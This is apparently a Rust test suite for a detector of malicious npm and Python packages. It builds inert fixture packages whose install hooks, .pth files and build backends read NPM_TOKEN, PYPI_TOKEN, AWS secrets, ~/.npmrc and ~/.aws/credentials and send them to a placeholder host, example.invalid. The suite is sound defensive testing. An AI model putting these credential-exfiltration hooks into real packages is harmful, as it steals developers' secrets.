use flate2::write::GzEncoder;
use flate2::Compression;
use std::io::{Cursor, Write};
use whoathere_artifact::{
    normalize_artifact, AcquisitionMethod, ArtifactEnvelope, ArtifactEnvelopeInput, ArtifactFormat,
    ArtifactSourceType, Ecosystem, NormalizationLimits, Sha256Digest,
};
use whoathere_detector::{
    analyze_normalized_artifact, ArtifactAnalysisCompleteness, ArtifactAnalysisOutcome,
    ArtifactFindingCategory, FindingLocation, FindingSpecificity, LocalCodeEdgeKind, TriggerKind,
};
use zip::write::SimpleFileOptions;

fn envelope(
    ecosystem: Ecosystem,
    name: &str,
    version: &str,
    filename: &str,
    format: ArtifactFormat,
    bytes: &[u8],
    requires_external_dependency_resolution: bool,
) -> ArtifactEnvelope {
    ArtifactEnvelope::from_original_bytes(
        ArtifactEnvelopeInput {
            ecosystem,
            package_name: Some(name.to_string()),
            package_version: Some(version.to_string()),
            source_coordinate: format!("fixture:{name}@{version}"),
            source_type: ArtifactSourceType::LocalFile,
            acquired_at: "2026-07-09T00:00:00Z".to_string(),
            acquisition_method: AcquisitionMethod::LocalInertFixture,
            original_filename: filename.to_string(),
            declared_format: Some(format),
            custody_reference: format!("inert-detector-fixture:{filename}"),
            resolver_metadata_sha256: None,
            registry_metadata_sha256: None,
            policy_version: "artifact-detector-test.v1".to_string(),
            requires_external_dependency_resolution,
        },
        bytes,
        format,
    )
}

fn tar_gzip(entries: &[(&str, &[u8], u32)]) -> Vec<u8> {
    let encoder = GzEncoder::new(Vec::new(), Compression::default());
    let mut archive = tar::Builder::new(encoder);
    for (path, bytes, mode) in entries {
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Regular);
        header.set_size(bytes.len() as u64);
        header.set_mode(*mode);
        header.set_uid(0);
        header.set_gid(0);
        header.set_mtime(0);
        header.set_cksum();
        archive
            .append_data(&mut header, *path, Cursor::new(*bytes))
            .expect("append inert fixture member");
    }
    archive
        .into_inner()
        .expect("finish tar")
        .finish()
        .expect("finish gzip")
}

fn normalize_npm(entries: &[(&str, &[u8], u32)]) -> whoathere_artifact::NormalizedArtifact {
    let bytes = tar_gzip(entries);
    let envelope = envelope(
        Ecosystem::Npm,
        "detector-fixture",
        "1.0.0",
        "detector-fixture-1.0.0.tgz",
        ArtifactFormat::NpmTarGzip,
        &bytes,
        false,
    );
    normalize_artifact(&envelope, &bytes, NormalizationLimits::default())
        .expect("normalize inert npm fixture")
}

fn wheel_record_hash(bytes: &[u8]) -> String {
    let digest_hex = whoathere_hash::sha256_hex(bytes);
    let digest_bytes = digest_hex
        .as_bytes()
        .chunks_exact(2)
        .map(|pair| {
            let pair = std::str::from_utf8(pair).expect("digest is ASCII");
            u8::from_str_radix(pair, 16).expect("digest is hexadecimal")
        })
        .collect::<Vec<_>>();
    format!("sha256={}", base64_url_no_pad(&digest_bytes))
}

fn base64_url_no_pad(bytes: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let mut output = String::new();
    for chunk in bytes.chunks(3) {
        let first = chunk[0];
        let second = chunk.get(1).copied().unwrap_or(0);
        let third = chunk.get(2).copied().unwrap_or(0);
        output.push(ALPHABET[(first >> 2) as usize] as char);
        output.push(ALPHABET[(((first & 3) << 4) | (second >> 4)) as usize] as char);
        if chunk.len() > 1 {
            output.push(ALPHABET[(((second & 15) << 2) | (third >> 6)) as usize] as char);
        }
        if chunk.len() > 2 {
            output.push(ALPHABET[(third & 63) as usize] as char);
        }
    }
    output
}

fn wheel_zip(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let record_path = "detector_wheel-1.0.0.dist-info/RECORD";
    let mut record = String::new();
    for (path, bytes) in entries {
        record.push_str(path);
        record.push(',');
        record.push_str(&wheel_record_hash(bytes));
        record.push(',');
        record.push_str(&bytes.len().to_string());
        record.push('\n');
    }
    record.push_str(record_path);
    record.push_str(",,\n");
    let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
    for (path, bytes) in entries {
        writer
            .start_file(*path, SimpleFileOptions::default())
            .expect("start wheel member");
        writer.write_all(bytes).expect("write wheel member");
    }
    writer
        .start_file(record_path, SimpleFileOptions::default())
        .expect("start RECORD");
    writer.write_all(record.as_bytes()).expect("write RECORD");
    writer.finish().expect("finish wheel").into_inner()
}

fn assert_bound_findings(
    artifact: &whoathere_artifact::NormalizedArtifact,
    analysis: &whoathere_detector::ArtifactStaticAnalysis,
) {
    analysis.validate(artifact).expect("analysis validates");
    assert!(!analysis.findings.is_empty());
    for finding in &analysis.findings {
        assert_eq!(finding.artifact_sha256, artifact.manifest.artifact_sha256);
        assert_eq!(finding.manifest_sha256, artifact.manifest.manifest_sha256);
        assert_eq!(finding.specificity, FindingSpecificity::PackageSpecific);
        assert_ne!(
            finding.evidence_digest,
            Sha256Digest::from_bytes(&[]),
            "evidence digest is populated"
        );
        let FindingLocation::File {
            file_id,
            file_sha256,
            ..
        } = &finding.location
        else {
            panic!("behavior finding must cite a normalized file");
        };
        let content = artifact
            .file(file_id)
            .expect("citation resolves by file id");
        assert_eq!(&content.sha256, file_sha256);
    }
}

#[test]
fn npm_lifecycle_bin_and_export_reach_cross_file_capabilities() {
    const PACKAGE_JSON: &[u8] = br#"{
  "name":"detector-fixture",
  "version":"1.0.0",
  "scripts":{"postinstall":"node boot.js"},
  "bin":{"detector-fixture":"bin/tool.js"},
  "exports":"./boot.js"
}"#;
    const BOOT: &[u8] = b"require('./lib/collect');\n";
    const COLLECT: &[u8] = br#"const fs = require('node:fs');
const token = process.env.NPM_TOKEN;
const config = fs.readFileSync(process.env.HOME + '/.npmrc');
const https = require('node:https');
https.request({method: 'POST'});
const child = require('node:child_process');
child.spawn('printf', [token, config.length]);
"#;
    const BIN: &[u8] = b"#!/usr/bin/env node\nconsole.log('inert');\n";
    let artifact = normalize_npm(&[
        ("package/package.json", PACKAGE_JSON, 0o644),
        ("package/boot.js", BOOT, 0o644),
        ("package/lib/collect.js", COLLECT, 0o644),
        ("package/bin/tool.js", BIN, 0o755),
    ]);
    let analysis = analyze_normalized_artifact(&artifact).expect("analyze npm artifact");

    assert_bound_findings(&artifact, &analysis);
    for kind in [
        TriggerKind::NpmLifecycle,
        TriggerKind::NpmBin,
        TriggerKind::NpmExport,
    ] {
        assert!(analysis
            .trigger_graph
            .surfaces
            .iter()
            .any(|surface| surface.kind == kind));
    }
    assert!(analysis
        .trigger_graph
        .local_code_edges
        .iter()
        .any(|edge| edge.kind == LocalCodeEdgeKind::JavascriptRequire));
    for category in [
        ArtifactFindingCategory::CredentialAccess,
        ArtifactFindingCategory::SensitivePathAccess,
        ArtifactFindingCategory::NetworkCapability,
        ArtifactFindingCategory::ProcessExecution,
        ArtifactFindingCategory::CredentialExfiltrationCapability,
    ] {
        assert!(analysis
            .findings
            .iter()
            .any(|finding| finding.category == category));
    }
    assert!(analysis
        .findings
        .iter()
        .all(|finding| { finding.category != ArtifactFindingCategory::DownloadExecuteCapability }));
}

#[test]
fn ordinary_lifecycle_build_is_no_finding_but_keeps_heuristic_limitations_explicit() {
    const PACKAGE_JSON: &[u8] = br#"{
  "name":"detector-fixture",
  "version":"1.0.0",
  "scripts":{"postinstall":"node build.js"},
  "exports":"./build.js"
}"#;
    const BUILD: &[u8] = b"const value = 40 + 2;\nconsole.log(value);\n";
    let artifact = normalize_npm(&[
        ("package/package.json", PACKAGE_JSON, 0o644),
        ("package/build.js", BUILD, 0o644),
    ]);
    let analysis = analyze_normalized_artifact(&artifact).expect("analyze benign npm artifact");

    analysis.validate(&artifact).expect("analysis validates");
    assert!(analysis.findings.is_empty());
    assert_eq!(
        analysis.coverage.completeness,
        ArtifactAnalysisCompleteness::Incomplete
    );
    assert_eq!(
        analysis.outcome,
        ArtifactAnalysisOutcome::IncompleteNoFinding
    );
    assert!(!analysis
        .is_bounded_no_finding(&artifact)
        .expect("validated outcome"));
}

#[test]
fn npm_custom_main_is_a_trigger_reachable_detection_surface() {
    const PACKAGE_JSON: &[u8] =
        br#"{"name":"detector-fixture","version":"1.0.0","main":"lib/start.js"}"#;
    const START: &[u8] = br#"const token = process.env.NPM_TOKEN;
require('node:https').request({method: 'POST'});
require('node:child_process').spawn('printf', [token]);
"#;
    let artifact = normalize_npm(&[
        ("package/package.json", PACKAGE_JSON, 0o644),
        ("package/lib/start.js", START, 0o644),
    ]);
    let analysis = analyze_normalized_artifact(&artifact).expect("analyze custom main fixture");

    assert_bound_findings(&artifact, &analysis);
    assert!(analysis.trigger_graph.surfaces.iter().any(|surface| {
        surface.kind == TriggerKind::NpmDefaultImport
            && surface.target_path.as_deref() == Some("lib/start.js")
    }));
    assert!(analysis
        .findings
        .iter()
        .any(|finding| finding.category == ArtifactFindingCategory::CredentialAccess));
}

#[test]
fn every_chained_and_extensionless_lifecycle_target_is_followed() {
    const PACKAGE_JSON: &[u8] = br#"{
  "name":"detector-fixture",
  "version":"1.0.0",
  "scripts":{"postinstall":"node benign.js && node scripts/payload"}
}"#;
    const BENIGN: &[u8] = b"console.log('build complete');\n";
    const PAYLOAD: &[u8] = br#"const secret = process.env.NPM_TOKEN;
fetch('https://example.invalid/collect?token=' + secret);
"#;
    let artifact = normalize_npm(&[
        ("package/package.json", PACKAGE_JSON, 0o644),
        ("package/benign.js", BENIGN, 0o644),
        ("package/scripts/payload.js", PAYLOAD, 0o644),
    ]);
    let analysis = analyze_normalized_artifact(&artifact).expect("analyze chained lifecycle");

    assert_bound_findings(&artifact, &analysis);
    for path in ["benign.js", "scripts/payload.js"] {
        assert!(analysis.trigger_graph.surfaces.iter().any(|surface| {
            surface.kind == TriggerKind::NpmLifecycle
                && surface.target_path.as_deref() == Some(path)
        }));
    }
    assert!(analysis.findings.iter().any(|finding| {
        finding.category == ArtifactFindingCategory::CredentialExfiltrationCapability
    }));
}

#[test]
fn implicit_and_explicit_node_gyp_targets_are_never_silently_clean() {
    const BINDING: &[u8] =
        br#"{"targets":[{"target_name":"x","actions":[{"action":["node","payload.js"]}]}]}"#;
    for package_json in [
        br#"{"name":"detector-fixture","version":"1.0.0"}"#.as_slice(),
        br#"{"name":"detector-fixture","version":"1.0.0","scripts":{"install":"node-gyp rebuild"}}"#.as_slice(),
    ] {
        let artifact = normalize_npm(&[
            ("package/package.json", package_json, 0o644),
            ("package/binding.gyp", BINDING, 0o644),
            ("package/payload.js", b"console.log('inert');\n", 0o644),
        ]);
        let analysis = analyze_normalized_artifact(&artifact).expect("analyze node-gyp fixture");

        assert!(analysis.trigger_graph.surfaces.iter().any(|surface| {
            surface.kind == TriggerKind::NpmImplicitNodeGyp
                && surface.target_path.as_deref() == Some("binding.gyp")
        }));
        let binding_coverage = analysis
            .coverage
            .files
            .iter()
            .find(|file| file.normalized_path == "binding.gyp")
            .expect("binding.gyp coverage");
        assert_eq!(
            binding_coverage.status,
            whoathere_detector::CoverageStatus::MetadataInventoryOnly
        );
        assert!(binding_coverage
            .limitations
            .iter()
            .any(|code| code == "metadata_semantics_inventoried_but_not_structurally_analyzed"));
        assert_eq!(
            analysis.coverage.completeness,
            ArtifactAnalysisCompleteness::Incomplete
        );
        assert!(!analysis
            .is_bounded_no_finding(&artifact)
            .expect("validated outcome"));
    }
}

#[test]
fn import_attempt_budget_is_bounded_and_forces_incomplete_coverage() {
    let package_json = br#"{"name":"detector-fixture","version":"1.0.0","main":"index.js"}"#;
    let mut imports = String::new();
    for index in 0..=whoathere_detector::MAX_IMPORT_ATTEMPTS {
        imports.push_str(&format!("require('./missing-{index}');\n"));
    }
    let artifact = normalize_npm(&[
        ("package/package.json", package_json, 0o644),
        ("package/index.js", imports.as_bytes(), 0o644),
    ]);
    let analysis = analyze_normalized_artifact(&artifact).expect("bounded import analysis");

    assert!(analysis
        .trigger_graph
        .limitations
        .iter()
        .any(|limitation| limitation == "local_import_attempt_limit_reached"));
    assert_eq!(
        analysis.coverage.completeness,
        ArtifactAnalysisCompleteness::Incomplete
    );
}

#[test]
fn unsupported_reachable_content_is_explicit_and_never_bounded_clean() {
    const PACKAGE_JSON: &[u8] = br#"{
  "name":"detector-fixture",
  "version":"1.0.0",
  "bin":{"detector-fixture":"tool.ps1"}
}"#;
    const POWERSHELL: &[u8] = b"Write-Output 'inert control'\n";
    let artifact = normalize_npm(&[
        ("package/package.json", PACKAGE_JSON, 0o644),
        ("package/tool.ps1", POWERSHELL, 0o644),
    ]);
    let analysis = analyze_normalized_artifact(&artifact).expect("analyze unsupported fixture");

    analysis.validate(&artifact).expect("analysis validates");
    assert!(analysis.findings.is_empty());
    assert_eq!(
        analysis.coverage.completeness,
        ArtifactAnalysisCompleteness::Incomplete
    );
    assert_eq!(
        analysis.outcome,
        ArtifactAnalysisOutcome::IncompleteNoFinding
    );
    assert!(!analysis
        .is_bounded_no_finding(&artifact)
        .expect("validated outcome"));
    assert!(analysis.coverage.files.iter().any(|file| {
        file.normalized_path == "tool.ps1"
            && file.status == whoathere_detector::CoverageStatus::UnsupportedLanguage
    }));
}

#[test]
fn wheel_graph_covers_pth_import_entry_point_script_and_native_inventory() {
    const METADATA: &[u8] = b"Metadata-Version: 2.1\nName: detector-wheel\nVersion: 1.0.0\n\n";
    const WHEEL: &[u8] =
        b"Wheel-Version: 1.0\nGenerator: inert-test\nRoot-Is-Purelib: true\nTag: py3-none-any\n";
    const ENTRY_POINTS: &[u8] = b"[console_scripts]\ndetector-wheel = detector_wheel.cli:main\n";
    const PTH: &[u8] = b"import detector_wheel.payload\n";
    const INIT: &[u8] = b"from .payload import collect\n";
    const CLI: &[u8] = b"def main():\n    return 0\n";
    const PAYLOAD: &[u8] = br#"import os
import requests
import subprocess
secret = os.getenv("AWS_SECRET_ACCESS_KEY")
data = open(os.path.expanduser("~/.aws/credentials")).read()
requests.post("https://example.invalid", data=secret)
subprocess.run(["printf", data])
"#;
    const SCRIPT: &[u8] = b"#!/usr/bin/env python3\nprint('inert')\n";
    const NATIVE: &[u8] = b"\x7fELF-inert-not-executable";
    let entries = [
        ("detector_wheel-1.0.0.dist-info/METADATA", METADATA),
        ("detector_wheel-1.0.0.dist-info/WHEEL", WHEEL),
        (
            "detector_wheel-1.0.0.dist-info/entry_points.txt",
            ENTRY_POINTS,
        ),
        ("detector_wheel.pth", PTH),
        ("detector_wheel/__init__.py", INIT),
        ("detector_wheel/cli.py", CLI),
        ("detector_wheel/payload.py", PAYLOAD),
        ("detector_wheel-1.0.0.data/scripts/tool", SCRIPT),
        ("detector_wheel/native.so", NATIVE),
    ];
    let bytes = wheel_zip(&entries);
    let envelope = envelope(
        Ecosystem::Pypi,
        "detector-wheel",
        "1.0.0",
        "detector_wheel-1.0.0-py3-none-any.whl",
        ArtifactFormat::WheelZip,
        &bytes,
        false,
    );
    let artifact = normalize_artifact(&envelope, &bytes, NormalizationLimits::default())
        .expect("normalize inert wheel");
    let analysis = analyze_normalized_artifact(&artifact).expect("analyze wheel");

    assert_bound_findings(&artifact, &analysis);
    for kind in [
        TriggerKind::WheelPth,
        TriggerKind::WheelImport,
        TriggerKind::WheelEntryPoint,
        TriggerKind::WheelScript,
        TriggerKind::WheelNativeLoad,
    ] {
        assert!(analysis
            .trigger_graph
            .surfaces
            .iter()
            .any(|surface| surface.kind == kind));
    }
    assert_eq!(
        analysis.coverage.completeness,
        ArtifactAnalysisCompleteness::Incomplete
    );
    assert!(!analysis
        .is_bounded_no_finding(&artifact)
        .expect("validated outcome"));
    assert!(analysis
        .coverage
        .limitations
        .iter()
        .any(|reason| reason == "one_or_more_executable_members_are_not_fully_analyzed"));
}

#[test]
fn sdist_graph_links_backend_path_setup_and_import_surfaces() {
    const PKG_INFO: &[u8] = b"Metadata-Version: 2.1\nName: detector-sdist\nVersion: 1.0.0\n\n";
    const PYPROJECT: &[u8] = br#"[build-system]
requires = []
build-backend = "backend_impl"
backend-path = ["backend"]
"#;
    const SETUP: &[u8] = b"from setuptools import setup\nsetup()\n";
    const SETUP_CFG: &[u8] = b"[metadata]\nname = detector-sdist\nversion = 1.0.0\n";
    const BACKEND: &[u8] = b"import helper\n";
    const HELPER: &[u8] = br#"import os
import httpx
token = os.environ["PYPI_TOKEN"]
httpx.post("https://example.invalid", content=token)
"#;
    const INIT: &[u8] = b"from . import payload\n";
    const PAYLOAD: &[u8] = br#"import os
import subprocess
subprocess.run(["printf", os.environ["PYPI_TOKEN"]])
"#;
    let bytes = tar_gzip(&[
        ("detector_sdist-1.0.0/PKG-INFO", PKG_INFO, 0o644),
        ("detector_sdist-1.0.0/pyproject.toml", PYPROJECT, 0o644),
        ("detector_sdist-1.0.0/setup.py", SETUP, 0o644),
        ("detector_sdist-1.0.0/setup.cfg", SETUP_CFG, 0o644),
        (
            "detector_sdist-1.0.0/backend/backend_impl.py",
            BACKEND,
            0o644,
        ),
        ("detector_sdist-1.0.0/backend/helper.py", HELPER, 0o644),
        (
            "detector_sdist-1.0.0/src/detector_sdist/__init__.py",
            INIT,
            0o644,
        ),
        (
            "detector_sdist-1.0.0/src/detector_sdist/payload.py",
            PAYLOAD,
            0o644,
        ),
    ]);
    let envelope = envelope(
        Ecosystem::Pypi,
        "detector-sdist",
        "1.0.0",
        "detector_sdist-1.0.0.tar.gz",
        ArtifactFormat::SdistTarGzip,
        &bytes,
        true,
    );
    let artifact = normalize_artifact(&envelope, &bytes, NormalizationLimits::default())
        .expect("normalize inert sdist");
    let analysis = analyze_normalized_artifact(&artifact).expect("analyze sdist");

    assert_bound_findings(&artifact, &analysis);
    for kind in [
        TriggerKind::SdistBuildBackend,
        TriggerKind::SdistSetupPy,
        TriggerKind::SdistSetupCfg,
        TriggerKind::SdistImport,
    ] {
        assert!(analysis
            .trigger_graph
            .surfaces
            .iter()
            .any(|surface| surface.kind == kind));
    }
    assert!(analysis
        .trigger_graph
        .local_code_edges
        .iter()
        .any(|edge| edge.kind == LocalCodeEdgeKind::PythonImport));
    let payload_id = artifact
        .files()
        .find(|file| file.normalized_path == "src/detector_sdist/payload.py")
        .expect("payload file")
        .file_id
        .clone();
    assert!(analysis
        .trigger_graph
        .local_code_edges
        .iter()
        .any(|edge| edge.to_file_id == payload_id));
    assert!(analysis.findings.iter().any(|finding| {
        finding.category == ArtifactFindingCategory::CredentialExfiltrationCapability
    }));
}

#[test]
fn forged_evidence_digest_and_file_citation_are_rejected() {
    const PACKAGE_JSON: &[u8] = br#"{
  "name":"detector-fixture",
  "version":"1.0.0",
  "scripts":{"postinstall":"node index.js"},
  "exports":"./index.js"
}"#;
    const INDEX: &[u8] =
        b"const token = process.env.NPM_TOKEN;\nfetch('https://example.invalid');\n";
    let artifact = normalize_npm(&[
        ("package/package.json", PACKAGE_JSON, 0o644),
        ("package/index.js", INDEX, 0o644),
    ]);
    let analysis = analyze_normalized_artifact(&artifact).expect("analyze fixture");
    analysis.validate(&artifact).expect("original validates");

    let mut forged_digest = analysis.clone();
    forged_digest.findings[0].evidence_digest = Sha256Digest::from_bytes(b"forged");
    assert!(forged_digest.validate(&artifact).is_err());

    let mut forged_citation = analysis;
    let FindingLocation::File { file_id, .. } = &mut forged_citation.findings[0].location else {
        panic!("expected file citation");
    };
    *file_id = Sha256Digest::from_bytes(b"not a normalized file");
    assert!(forged_citation.validate(&artifact).is_err());
}
